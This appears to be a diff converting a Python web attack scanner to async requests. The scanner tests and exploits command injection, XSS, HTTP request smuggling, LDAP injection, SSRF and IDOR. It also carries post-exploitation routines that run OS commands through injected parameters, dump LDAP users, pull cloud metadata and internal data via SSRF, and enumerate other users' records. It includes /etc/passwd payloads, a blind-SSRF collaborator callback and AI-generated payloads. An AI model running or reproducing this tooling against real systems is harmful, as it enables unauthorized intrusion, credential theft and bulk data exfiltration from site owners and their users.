+                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
 
-                if res and marker in res.text:
+                if res and marker in await res.text():
                     output.print(f"  [CRITICAL] Command Injection confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
                     
                     # 2. PoC Automation & Core Evidence Collection
-                    evidence = f"Initial detection response with marker '{marker}':\n---\n{res.text[:300]}\n-\n\n"
+                    evidence = f"Initial detection response with marker '{marker}':\n---\n{(await res.text())[:300]}\n-\n\n"
                     
                     # Define commands for Linux and Windows
                     poc_commands = {
@@ -3213,11 +3051,11 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
                         cmd_payload = encoded_p.replace(f"echo {marker}", cmd)
                         
                         exploit_url, exploit_data = build_request(url, method, param_name, original_value + cmd_payload, form_data, original_query)
-                        res_exploit, request_details, response_details = _send_http_request(exploit_url, method=method, data=exploit_data, output=output, session_cookies=session_cookies)
+                        res_exploit, request_details, response_details = await _send_async_http_request(exploit_url, method=method, data=exploit_data, output=output, session_cookies=session_cookies)
                         
                         if res_exploit and res_exploit.text:
                             # More robustly clean the output
-                            soup = BeautifulSoup(res_exploit.text, "html.parser")
+                            soup = BeautifulSoup(await res_exploit.text(), "html.parser")
                             clean_output = soup.get_text(separator="\n").strip()
                             
                             # Remove the random marker if it's still there
@@ -3240,7 +3078,7 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
 
             start_time = time.time()
             test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-            _, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, timeout=12, output=output, session_cookies=session_cookies)
+            _, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=12, output=output, session_cookies=session_cookies)
             end_time = time.time()
 
             if (end_time - start_time) > 9:
@@ -3255,18 +3093,18 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
         # AI-Powered Dynamic Payload Generation
         if ai_enabled:
             output.print("    [AI MODE] Initial command injection checks failed. Generating dynamic payloads...")
-            res_for_ai, request_details, response_details = _send_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
-            response_snippet = res_for_ai.text[:500] if res_for_ai else "No response."
+            res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
+            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
 
             ai_payloads = ai_generate_dynamic_payloads("Command Injection", f"| echo {marker}", response_snippet, output)
             for p in ai_payloads:
                 # Test AI-generated payloads
                 test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
-                if res and marker in res.text:
+                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                if res and marker in await res.text():
                     output.print(f"  [CRITICAL] AI-Generated Command Injection confirmed with payload: {p}")
                     # This part can be enhanced to reuse the post-exploitation logic
-                    report.add_finding("AI-Generated Command Injection (RCE)", "Critical", url, param_name, p, "The application is vulnerable to OS Command Injection, found with an AI-generated payload.", "Use safe APIs that do not invoke shell commands.", f"Vulnerable URL: {test_url}\nPayload: {p}\nResponse snippet: {res.text[:300]}")
+                    report.add_finding("AI-Generated Command Injection (RCE)", "Critical", url, param_name, p, "The application is vulnerable to OS Command Injection, found with an AI-generated payload.", "Use safe APIs that do not invoke shell commands.", f"Vulnerable URL: {test_url}\nPayload: {p}\nResponse snippet: {(await res.text())[:300]}")
                     return True
 
         return False
@@ -3282,7 +3120,7 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
         for i in range(len(params)):
             if '=' not in params[i]: continue
             param_name, value = params[i].split('=', 1)
-            if test_and_exploit_cmd(target, 'get', param_name, value, original_query=original_query):
+            if await test_and_exploit_cmd(target, 'get', param_name, value, original_query=original_query):
                 vulnerability_found = True
                 return
 
@@ -3294,7 +3132,7 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
             if input_field['type'] in ['submit', 'hidden']: continue
             param_name = input_field['name']
             original_value = input_field.get('value', 'test')
-            if test_and_exploit_cmd(action_url, form_to_test['method'], param_name, original_value, form_data=form_data):
+            if await test_and_exploit_cmd(action_url, form_to_test['method'], param_name, original_value, form_data=form_data):
                 vulnerability_found = True
                 return
 
@@ -3304,13 +3142,13 @@ def check_command_injection(target, form_to_test, output, tech, report, session_
         # Focus on parameters likely to be used in shell commands
         cmd_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['exec', 'cmd', 'run', 'ping', 'query', 'call', 'do', 'test', 'file', 'load', 'read'])]
         for param_name in cmd_params:
-            if test_and_exploit_cmd(base_url_without_query, 'get', param_name, 'test', original_query=None):
+            if await test_and_exploit_cmd(base_url_without_query, 'get', param_name, 'test', original_query=None):
                 vulnerability_found = True
                 return
 
 
 # --- 8. XSS ---
-def check_xss(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+async def check_xss(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print(f"\n[+] Starting Ultimate XSS Scan on {target}...")
     marker = f"XSS{get_random_string(4)}"
     xss_collaborator_domain = "xss-collaborator.example.com" # Placeholder for a real collaborator service
@@ -3647,24 +3485,24 @@ def check_xss(target, form_to_test, output, tech, report, session_cookies=None, 
         *[f"<img src='#' onerror='alert(\"{marker}{i}\")'>" for i in range(50)],
     ]
 
-    def test_xss(url, method, param_name, original_value, payload, form_data=None, original_query=None):
+    async def test_xss(url, method, param_name, original_value, payload, form_data=None, original_query=None):
         # We test the raw payload and its HTML-entity encoded version
         test_payloads = {payload, html.escape(payload)}
         
         for p in test_payloads:
             full_payload = original_value + p
             test_url, test_data = build_request(url, method, param_name, full_payload, form_data, original_query)
-            res_xss, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+            res_xss, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
             
             # The core evidence for XSS is the unescaped reflection of the payload.
-            if res_xss and p in res_xss.text and "text/html" in res_xss.headers.get("Content-Type", ""):
+            if res_xss and p in await res_xss.text() and "text/html" in res_xss.headers.get("Content-Type", ""):
                 # Check if the payload is reflected unescaped or if it's a self-contained XSS payload
-                if html.escape(p) not in res_xss.text or p == html.escape(p) or re.search(r'<script[^>]*>.*alert\(', p, re.IGNORECASE):
+                if html.escape(p) not in await res_xss.text() or p == html.escape(p) or re.search(r'<script[^>]*>.*alert\(', p, re.IGNORECASE):
                     output.print(f"  [HIGH] Reflected XSS found in {method.upper()} param '{param_name}'")
                     
-                    snippet_start = max(0, res_xss.text.find(p) - 100)
-                    snippet_end = min(len(res_xss.text), res_xss.text.find(p) + len(p) + 100)
-                    evidence_snippet = res_xss.text[snippet_start:snippet_end]
+                    snippet_start = max(0, (await res_xss.text()).find(p) - 100)
+                    snippet_end = min(len(await res_xss.text()), (await res_xss.text()).find(p) + len(p) + 100)
+                    evidence_snippet = (await res_xss.text())[snippet_start:snippet_end]
                     
                     evidence = f"Vulnerable URL: {test_url}\nReflected Payload: {p}\n\n--- Response Snippet ---\n{evidence_snippet}\n---"
                     
@@ -3718,7 +3556,7 @@ def check_xss(target, form_to_test, output, tech, report, session_cookies=None, 
         
         # Phase 1: Probe with high-probability payloads
         for payload in xss_probes:
-            found, res_xss = test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
+            found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
             if found:
                 vulnerable = True
                 break
@@ -3729,7 +3567,7 @@ def check_xss(target, form_to_test, output, tech, report, session_cookies=None, 
         # Phase 2: Full scan if probes fail
         output.print(f"  [*] No immediate XSS found with probes. Starting deep scan for '{point['param']}'...")
         for payload in payloads:
-            found, res_xss = test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
+            found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
             if found:
                 vulnerable = True
                 break
@@ -3740,12 +3578,12 @@ def check_xss(target, form_to_test, output, tech, report, session_cookies=None, 
         # Phase 3: AI-Powered Dynamic Payload Generation
         if ai_enabled and not vulnerable:
             output.print(f"  [AI MODE] Initial XSS checks failed for param '{point['param']}'. Generating dynamic payloads...")
-            res_for_ai, request_details, response_details = _send_http_request(point['url'], method=point['method'], data=point.get('form_data'), output=output, session_cookies=session_cookies)
-            response_snippet = res_for_ai.text[:500] if res_for_ai else "No response."
+            res_for_ai, request_details, response_details = await _send_async_http_request(point['url'], method=point['method'], data=point.get('form_data'), output=output, session_cookies=session_cookies)
+            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
             
             ai_payloads = ai_generate_dynamic_payloads("Reflected XSS", f"<script>alert('{marker}')</script>", response_snippet, output)
             for payload in ai_payloads:
-                found, res_xss = test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
+                found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
                 if found:
                     vulnerable = True
                     break
@@ -3756,7 +3594,7 @@ def check_xss(target, form_to_test, output, tech, report, session_cookies=None, 
 
 
 # --- 9. HTTP Smuggling ---
-def check_http_smuggling(target, output, tech, report, session_cookies=None, ai_enabled=False):
+async def check_http_smuggling(target, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print("\n[+] Starting Ultimate HTTP Smuggling Scan...")
     target_url = normalize_target(target)
     host = urlparse(target_url).netloc
@@ -3788,21 +3626,33 @@ def check_http_smuggling(target, output, tech, report, session_cookies=None, ai_
                                        f"GET /smuggled_full HTTP/1.1\r\nHost: {host}\r\nX-Smuggled-Check: Full\r\n\r\n").encode()
 
 
-    def _run_smuggling_test(test_name, payload):
+    async def _run_smuggling_test(test_name, payload):
         try:
             parsed_url = urlparse(target_url)
             port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
-            context = ssl.create_default_context() if parsed_url.scheme == 'https' else None
-
-            with socket.create_connection((host, port), timeout=10) as sock1_raw:
-                sock1 = context.wrap_socket(sock1_raw, server_hostname=host) if context else sock1_raw
-                sock1.sendall(payload)
-                time.sleep(2) # Give server time to process
-                with socket.create_connection((host, port), timeout=10) as sock2_raw:
-                    sock2 = context.wrap_socket(sock2_raw, server_hostname=host) if context else sock2_raw
-                    sock2.sendall(f"GET /404_check HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
-                    response = sock2.recv(4096)
             
+            # Use asyncio.open_connection for asynchronous socket operations
+            reader1, writer1 = await asyncio.open_connection(host, port)
+            if parsed_url.scheme == 'https':
+                # Wrap the socket in SSL if it's HTTPS
+                ssl_context = ssl.create_default_context()
+                await writer1.start_tls(ssl_context, server_hostname=host)
+
+            writer1.write(payload)
+            await writer1.drain()
+            await asyncio.sleep(2) # Give server time to process
+
+            reader2, writer2 = await asyncio.open_connection(host, port)
+            if parsed_url.scheme == 'https':
+                await writer2.start_tls(ssl_context, server_hostname=host)
+
+            writer2.write(f"GET /404_check HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+            await writer2.drain()
+            response = await reader2.read(4096)
+            
+            writer1.close()
+            writer2.close()
+
             if b"HTTP/1.1 404 Not Found" not in response and b"smuggled" in response.lower():
                 output.print(f"  [CRITICAL] Potential HTTP Request Smuggling ({test_name}) detected!")
                 evidence = f"Payload Sent:\n```\n{payload.decode(errors='ignore')}\n```\nResponse to subsequent request:\n```\n{response.decode(errors='ignore')[:500]}\n```"
@@ -3816,17 +3666,17 @@ def check_http_smuggling(target, output, tech, report, session_cookies=None, ai_
     # Phase 1: Probing
     output.print("  [*] Probing for basic HTTP Smuggling patterns...")
     for name, payload in smuggling_probes.items():
-        if _run_smuggling_test(name, payload):
+        if await _run_smuggling_test(name, payload):
             return # Vulnerability found, no need for full scan
 
     # Phase 2: Full Scan
     output.print("  [*] No immediate smuggling detected. Starting deep scan with all payloads...")
     for name, payload in smuggling_tests.items():
-        if _run_smuggling_test(name, payload):
+        if await _run_smuggling_test(name, payload):
             return # Vulnerability found, stop.
 
 # --- [NEW] LDAP Injection ---
-def check_ldap_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+async def check_ldap_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
     output.print(f"\n[+] Starting Ultimate LDAP Injection Scan on {target}...")
 
     # v7.0 - 500+ LDAP Payloads
@@ -3885,22 +3735,22 @@ def check_ldap_injection(target, form_to_test, output, tech, report, session_coo
         "ldap_search()", "ldap entry", "search filter is invalid"
     ]
 
-    def test_ldap(url, method, param_name, original_value, form_data=None, original_query=None):
+    async def test_ldap(url, method, param_name, original_value, form_data=None, original_query=None):
         for p in ldap_payloads:
             for encoded_p in get_encoded_payloads(p):
                 test_url, test_data = build_request(url, method, param_name, original_value + encoded_p, form_data, original_query)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
 
-                if res and any(e in res.text.lower() for e in ldap_errors):
+                if res and any(e in (await res.text()).lower() for e in ldap_errors):
                     output.print(f"  [CRITICAL] Error-Based LDAP Injection confirmed in {method.upper()} param '{param_name}' with payload: {encoded_p}")
-                    evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{res.text[:400]}\n---"
+                    evidence = f"Vulnerable URL: {test_url}\nPayload: {encoded_p}\n\n--- Response Snippet (Error Message) ---\n{(await res.text())[:400]}\n---"
                     
                     # Post-exploitation: try to dump all users
                     dump_payload = "(&(objectClass=*)(uid=*))"
                     dump_url, dump_data = build_request(url, method, param_name, original_value + dump_payload, form_data, original_query)
-                    res_dump, req_dump, resp_dump = _send_http_request(dump_url, method=method, data=dump_data, output=output, session_cookies=session_cookies)
-                    if res_dump and not any(e in res_dump.text.lower() for e in ldap_errors):
-                        evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{res_dump.text[:500]}\n---"
+                    res_dump, req_dump, resp_dump = await _send_async_http_request(dump_url, method=method, data=dump_data, output=output, session_cookies=session_cookies)
+                    if res_dump and not any(e in (await res_dump.text()).lower() for e in ldap_errors):
+                        evidence += f"\n\n--- Post-Exploitation (User Dump Attempt) ---\nPayload: {dump_payload}\nResponse Snippet:\n{(await res_dump.text())[:500]}\n---"
                         output.print(f"    [SUCCESS] Post-exploitation payload sent. Response may contain user data.")
 
                     report.add_finding("LDAP Injection", "Critical", url, param_name, encoded_p,
@@ -3942,7 +3792,7 @@ def check_ldap_injection(target, form_to_test, output, tech, report, session_coo
     # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing LDAP Injection on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        if test_ldap(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
+        if await test_ldap(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query']):
             return # Vulnerability found, stop for this target
 
     output.print(f"  [INFO] No LDAP Injection detected for target {target} after all checks.")
@@ -3950,57 +3800,57 @@ def check_ldap_injection(target, form_to_test, output, tech, report, session_coo
 
 
 # --- 10. React2Shell ---
-def scan_react2shell(target, output, tech, report, session_cookies=None):
+async def scan_react2shell(target, output, tech, report, session_cookies=None):
     output.print("\n[+] Starting React2Shell Scan...")
     target_url = normalize_target(target)
     
     env_paths = ["/.env", "/.env.local", "/.env.development", "/.env.production"]
     for path in env_paths:
         url = urljoin(target_url, path)
-        res, request_details, response_details = _send_http_request(url, output=output, session_cookies=session_cookies)
-        if res and res.status_code == 200 and ("API_KEY" in res.text or "DB_PASSWORD" in res.text or "SECRET_KEY" in res.text):
+        res, request_details, response_details = await _send_async_http_request(url, output=output, session_cookies=session_cookies)
+        if res and res.status == 200 and ("API_KEY" in await res.text() or "DB_PASSWORD" in await res.text() or "SECRET_KEY" in await res.text()):
             output.print(f"  [CRITICAL] Exposed .env file found at: {url}")
             report.add_finding("Exposed Environment File", "Critical", url, "N/A", "N/A", 
                                "A sensitive environment file (.env) was found, potentially exposing credentials, API keys, and other secrets.", 
                                "Configure the web server to deny access to .env files. These files should never be in a web-accessible directory.",
-                               f"Exposed URL: {url}\nContent snippet: {res.text[:200]}...")
+                               f"Exposed URL: {url}\nContent snippet: {(await res.text())[:200]}...")
             return
 
     output.print("  [*] Checking for exposed source maps...")
     js_files = []
-    res, request_details, response_details = _send_http_request(target_url, output=output, session_cookies=session_cookies)
+    res, request_details, response_details = await _send_async_http_request(target_url, output=output, session_cookies=session_cookies)
     if res:
-        soup = BeautifulSoup(res.text, 'html.parser')
+        soup = BeautifulSoup(await res.text(), 'html.parser')
         for script in soup.find_all('script', src=True):
             if script['src'].endswith('.js'):
                 js_files.append(urljoin(target_url, script['src']))
     
     for js_file in js_files:
         map_file = f"{js_file}.map"
-        res_map, request_details, response_details = _send_http_request(map_file, output=output, session_cookies=session_cookies)
-        if res_map and res_map.status_code == 200 and "sourcesContent" in res_map.text:
+        res_map, request_details, response_details = await _send_async_http_request(map_file, output=output, session_cookies=session_cookies)
+        if res_map and res_map.status == 200 and "sourcesContent" in await res_map.text():
             output.print(f"  [HIGH] Exposed JavaScript Source Map found at: {map_file}")
             report.add_finding("Exposed JavaScript Source Map", "High", map_file, "N/A", "N/A", 
                                "An exposed JavaScript source map can reveal original source code, potentially exposing sensitive logic or credentials.", 
                                "Ensure source maps are not publicly accessible in production environments.",
-                               f"Exposed Source Map URL: {map_file}\nContent snippet: {res_map.text[:200]}")
+                               f"Exposed Source Map URL: {map_file}\nContent snippet: {(await res_map.text())[:200]}")
 
     output.print("  [*] Checking for Server-Side Rendering (SSR) vulnerabilities (conceptual)...")
     ssr_payload = "{{7*7}}"
     test_url = f"{target_url}?name={quote(ssr_payload)}"
-    res_ssr, request_details, response_details = _send_http_request(test_url, output=output, session_cookies=session_cookies)
-    if res_ssr and "49" in res_ssr.text:
+    res_ssr, request_details, response_details = await _send_async_http_request(test_url, output=output, session_cookies=session_cookies)
+    if res_ssr and "49" in await res_ssr.text():
         output.print(f"  [CRITICAL] Potential SSR Injection found with payload: {ssr_payload}")
         report.add_finding("Server-Side Rendering (SSR) Injection", "Critical", test_url, "name", ssr_payload,
                            "The application appears vulnerable to SSR injection, which could lead to RCE or information disclosure.",
                            "Ensure all user input rendered server-side is properly sanitized and escaped.",
-                           f"Vulnerable URL: {test_url}\nPayload: {ssr_payload}\nResponse snippet: {res_ssr.text[:200]}")
+                           f"Vulnerable URL: {test_url}\nPayload: {ssr_payload}\nResponse snippet: {(await res_ssr.text())[:200]}")
         return
 
     output.print("  [INFO] React2Shell scan completed.")
 
 # --- SSRF Helper Functions ---
-def _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, original_query, output, session_cookies):
+async def _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, original_query, output, session_cookies):
     """
     SSRF가 확인되면 내부 서비스 및 클라우드 메타데이터에서 추가 정보를 덤프합니다.
     """
@@ -4026,17 +3876,17 @@ def _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, 
         output.print(f"      [SSRF] Probing: {desc} ({internal_url_payload})")
         
         test_url, test_data = build_request(url, method, param_name, original_value + internal_url_payload, form_data, original_query)
-        res, _, _ = _send_http_request(test_url, method=method, data=test_data, timeout=5, output=output, session_cookies=session_cookies)
+        res, _, _ = await _send_async_http_request(test_url, method=method, data=test_data, timeout=5, output=output, session_cookies=session_cookies)
 
-        if res and res.text and res.status_code == 200:
+        if res and res.text and res.status == 200:
             # Filter out generic error pages or empty responses
-            if not any(err in res.text.lower() for err in ['not found', 'error', 'invalid', 'bad request', 'forbidden']) and len(res.text) > 50:
-                dump_result.append(f"--- Data from {desc} ({internal_url_payload}) ---\n{res.text[:1000]}...")
+            if not any(err in (await res.text()).lower() for err in ['not found', 'error', 'invalid', 'bad request', 'forbidden']) and len(await res.text()) > 50:
+                dump_result.append(f"--- Data from {desc} ({internal_url_payload}) ---\n{(await res.text())[:1000]}...")
                 output.print(f"        [SSRF] Successfully retrieved data from {desc}.")
             else:
-                dump_result.append(f"--- Probe to {desc} ({internal_url_payload}) returned status {res.status_code} ---\n{res.text[:200]}...")
+                dump_result.append(f"--- Probe to {desc} ({internal_url_payload}) returned status {res.status} ---\n{(await res.text())[:200]}...")
         elif res:
-            dump_result.append(f"--- Probe to {desc} ({internal_url_payload}) returned status {res.status_code} ---\nNo significant data.")
+            dump_result.append(f"--- Probe to {desc} ({internal_url_payload}) returned status {res.status} ---\nNo significant data.")
         else:
             dump_result.append(f"--- Probe to {desc} ({internal_url_payload}) failed to get a response. ---")
 
@@ -4044,7 +3894,7 @@ def _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, 
 
 # --- 11. SSRF ---
 
-def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None):
+async def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None):
     output.print(f"\n[+] Starting Ultimate SSRF Scan...")
     
     # v7.0 - 500+ Payloads
@@ -4107,29 +3957,29 @@ def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None)
         *[f"netdoc:///etc/passwd"],
     ]
 
-    def test_ssrf(url, method, param_name, original_value, form_data=None, original_query=None):
+    async def test_ssrf(url, method, param_name, original_value, form_data=None, original_query=None):
             found_ssrf = False
             ssrf_evidence = []
     
             for payload in ssrf_payloads:
                 test_url, test_data = build_request(url, method, param_name, original_value + payload, form_data, original_query)
-                res, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, timeout=5, output=output, session_cookies=session_cookies)
+                res, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=5, output=output, session_cookies=session_cookies)
                 
-                if res and ("root:x:0:0" in res.text or "[fonts]" in res.text or "for 16-bit app support" in res.text):
+                if res and ("root:x:0:0" in await res.text() or "[fonts]" in await res.text() or "for 16-bit app support" in await res.text()):
                     output.print(f"  [CRITICAL] SSRF to LFI confirmed in {method.upper()} param '{param_name}' with payload: {payload}")
-                    ssrf_evidence.append(f"SSRF to LFI detected with payload: {payload}\nResponse snippet: {res.text[:400]}...")
+                    ssrf_evidence.append(f"SSRF to LFI detected with payload: {payload}\nResponse snippet: {(await res.text())[:400]}...")
                     found_ssrf = True
                     break
     
-                if res and ("computeMetadata" in res.text or "instance-id" in res.text or "security-credentials" in res.text or "meta-data" in res.text):
+                if res and ("computeMetadata" in await res.text() or "instance-id" in await res.text() or "security-credentials" in await res.text() or "meta-data" in await res.text()):
                     output.print(f"  [CRITICAL] SSRF to Cloud Metadata confirmed in {method.upper()} param '{param_name}' with payload: {payload}")
-                    ssrf_evidence.append(f"SSRF to Cloud Metadata detected with payload: {payload}\nResponse snippet: {res.text[:400]}...")
+                    ssrf_evidence.append(f"SSRF to Cloud Metadata detected with payload: {payload}\nResponse snippet: {(await res.text())[:400]}...")
                     found_ssrf = True
                     break
             
             if found_ssrf:
                 # Perform data dump from internal services
-                dumped_data = _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, original_query, output, session_cookies)
+                dumped_data = await _exploit_ssrf_data_dump(url, method, param_name, original_value, form_data, original_query, output, session_cookies)
                 if dumped_data:
                     ssrf_evidence.append("\n--- Internal Data Dump via SSRF ---")
                     ssrf_evidence.append(dumped_data)
@@ -4145,7 +3995,7 @@ def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None)
             # For blind SSRF, we just send the payload and report it as informational
             oob_payload = f"http://{get_random_string(12)}.burpcollaborator.net"
             test_url, test_data = build_request(url, method, param_name, original_value + oob_payload, form_data, original_query)
-            _, request_details, response_details = _send_http_request(test_url, method=method, data=test_data, timeout=3, output=output, session_cookies=session_cookies)        
+            _, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, timeout=3, output=output, session_cookies=session_cookies)        
             output.print(f"  [INFO] Sent Blind SSRF payload for param '{param_name}'. Check collaborator for interaction: {oob_payload}")
             ssrf_evidence.append(f"Blind SSRF payload sent: {oob_payload}. Manual verification required by checking collaborator logs.")
             
@@ -4182,7 +4032,7 @@ def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None)
     # 4. Execute attacks
     for point in attack_points:
         output.print(f"  [*] Testing SSRF on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        found_ssrf, ssrf_evidence = test_ssrf(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'])
+        found_ssrf, ssrf_evidence = await test_ssrf(point['url'], point['method'], point['param'], point['value'], point['form_data'], point['original_query'])
         
         if found_ssrf:
             return # Found a vulnerability, exit the entire function
@@ -4196,7 +4046,7 @@ def check_ssrf(target, form_to_test, output, tech, report, session_cookies=None)
     output.print("  [INFO] No SSRF detected after all checks.")
 
 # --- IDOR Helper Functions ---
-def _exploit_idor_data_dump(original_url, param_name, initial_id, method, form_data, output, session_cookies):
+async def _exploit_idor_data_dump(original_url, param_name, initial_id, method, form_data, output, session_cookies):
     """
     IDOR이 확인되면 주변 ID를 열거하고 데이터를 덤프합니다.
     """
@@ -4254,17 +4104,17 @@ def _exploit_idor_data_dump(original_url, param_name, initial_id, method, form_d
         if current_form_data:
             current_form_data[param_name] = str(test_id)
 
-        res, _, _ = _send_http_request(current_url, method=method, data=current_form_data, output=output, session_cookies=session_cookies)
+        res, _, _ = await _send_async_http_request(current_url, method=method, data=current_form_data, output=output, session_cookies=session_cookies)
 
-        if res and res.status_code == 200:
+        if res and res.text and res.status == 200:
             # Filter out generic error pages or empty responses
-            if not any(err in res.text.lower() for err in ['not found', 'error', 'access denied', 'does not exist']) and len(res.text) > 100:
-                dump_result.append(f"--- Data for ID '{test_id}' from {current_url} ---\n{res.text[:1000]}...")
+            if not any(err in (await res.text()).lower() for err in ['not found', 'error', 'access denied', 'does not exist']) and len(await res.text()) > 100:
+                dump_result.append(f"--- Data for ID '{test_id}' from {current_url} ---\n{(await res.text())[:1000]}...")
                 output.print(f"        [IDOR] Successfully retrieved data for ID '{test_id}'.")
             else:
-                dump_result.append(f"--- Probe to ID '{test_id}' returned status {res.status_code} ---\nNo significant data or error page.")
+                dump_result.append(f"--- Probe to ID '{test_id}' returned status {res.status} ---\nNo significant data or error page.")
         elif res:
-            dump_result.append(f"--- Probe to ID '{test_id}' returned status {res.status_code} ---\nNo significant data.")
+            dump_result.append(f"--- Probe to ID '{test_id}' returned status {res.status} ---\nNo significant data.")
         else:
             dump_result.append(f"--- Probe to ID '{test_id}' failed to get a response. ---")
 
@@ -4272,7 +4122,7 @@ def _exploit_idor_data_dump(original_url, param_name, initial_id, method, form_d
 
 # --- 12. IDOR ---
 
-def check_idor(target, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None, ai_enabled=False):
+async def check_idor(target, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None, ai_enabled=False):
     output.print(f"\n[+] Starting Dynamic IDOR Scan on target: {target}...")
     
     if discovered_urls is None: discovered_urls = []
@@ -4322,11 +4172,11 @@ def check_idor(target, output, tech, report, session_cookies=None, discovered_ur
         numeric_probes.discard(original_id)
         
         for test_id in sorted(list(numeric_probes)):
-            found, vul_url, vul_param, vul_id, vul_method, vul_form_data = _perform_idor_test(str(test_id), point, tested_combinations, output, report, session_cookies)
+            found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(str(test_id), point, tested_combinations, output, report, session_cookies)
             if found:
                 found_idor = True
                 # Perform data dump
-                dumped_data = _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
+                dumped_data = await _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
                 if dumped_data:
                     idor_evidence.append("\n--- Enumerated Data via IDOR ---")
                     idor_evidence.append(dumped_data)
@@ -4354,11 +4204,11 @@ def check_idor(target, output, tech, report, session_cookies=None, discovered_ur
                 if ai_suggestions:
                     output.print(f"    [AI INFO] Generated {len(ai_suggestions)} new ID patterns to test.")
                     for test_id_str in ai_suggestions:
-                        found, vul_url, vul_param, vul_id, vul_method, vul_form_data = _perform_idor_test(test_id_str, point, tested_combinations, output, report, session_cookies)
+                        found, vul_url, vul_param, vul_id, vul_method, vul_form_data = await _perform_idor_test(test_id_str, point, tested_combinations, output, report, session_cookies)
                         if found:
                             found_idor = True
                             # Perform data dump
-                            dumped_data = _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
+                            dumped_data = await _exploit_idor_data_dump(vul_url, vul_param, vul_id, vul_method, vul_form_data, output, session_cookies)
                             if dumped_data:
                                 idor_evidence.append("\n--- Enumerated Data via IDOR ---")
                                 idor_evidence.append(dumped_data)
@@ -4379,7 +4229,7 @@ def check_idor(target, output, tech, report, session_cookies=None, discovered_ur
     output.print("  [INFO] IDOR scan completed.")
 
 
-def _perform_idor_test(test_id_str, point_info, tested_combinations, output, report, session_cookies):
+async def _perform_idor_test(test_id_str, point_info, tested_combinations, output, report, session_cookies):
     """Helper function to execute a single IDOR test and report findings."""
     original_url = point_info['original_url']
     method = point_info.get('method', 'GET').upper()
@@ -4395,8 +4245,8 @@ def _perform_idor_test(test_id_str, point_info, tested_combinations, output, rep
         tested_combinations.add(test_key)
         
         output.print(f"  [*] Testing IDOR: {original_url} -> {modified_url}")
-        res_orig, request_details_orig, response_details_orig = _send_http_request(original_url, output=output, session_cookies=session_cookies)
-        res_test, request_details_test, response_details_test = _send_http_request(modified_url, output=output, session_cookies=session_cookies)
+        res_orig, request_details_orig, response_details_orig = await _send_async_http_request(original_url, output=output, session_cookies=session_cookies)
